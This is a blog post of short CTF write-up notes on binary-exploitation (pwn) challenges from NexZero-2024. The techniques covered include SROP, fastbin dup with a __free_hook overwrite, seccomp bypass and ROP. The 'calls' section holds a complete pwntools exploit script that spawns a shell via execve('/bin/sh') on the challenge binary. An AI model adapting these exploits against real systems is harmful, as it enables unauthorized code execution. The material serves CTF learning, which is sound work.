---
title: Pwn Recaps
published: 2025-04-25
description: 'pwn notes related to ctfs'
image: ''
tags: [pwn]
category: 'Writups'
draft: false 
lang: ''
---

# NexZero-2024
## calls
- small binary, there is no pop gadgets, the trick is to find the hidden `/bin/sh` string using strings cmd
- use read syscall as a `pop rax` gadget then do srop
<details>
  <summary>payload</summary>

```python
from pwn import *

elf = context.binary = ELF("chall")
p = process()


SYSCALL = 0x0000000000401019
frame = SigreturnFrame()
frame.rax = 0x3b               # syscall number for execve
frame.rdi = 0x40200f           # pointer to /bin/sh
frame.rsi = 0x0                # NULL
frame.rdx = 0x0                # NULL
frame.rip = 0x0000000000401019

# gdb.attach(p,"b *0x0000000000401037")
p.sendline(cyclic(32) + p64(0x000000000040101f) + cyclic(32) + p64(SYSCALL) + bytes(frame))
input()
p.send(b"A" * 15)

p.interactive()

# nexus{b33p_b00p_s1GnAl_f0R_The_win}
```
</details>

## cramped
- a buffer overflow challenge, we can controle the `rbp` and the `return address`
- there is a win function with check for params, we can just jump passed that and if we set `rbp` to point to a r/w section aka `bss` we get the flag
## doubles
- standard fastbin dup chall from pwn.college
- use after free in the free function, and a global array with no pie
- just get a write in the global array, make a entry point to `__free_hook` overwrite it with `system`, and call free with `/bin/sh`
## filter
- standard filter challenge with seccomp, just open read write
## monGOal
- first time seeing a binary packed with upx, and also first time doing a go challenge
- other then this, its a simple rop to systell challenge, and uses `xchg` which is neet  

:::hide
asd
:::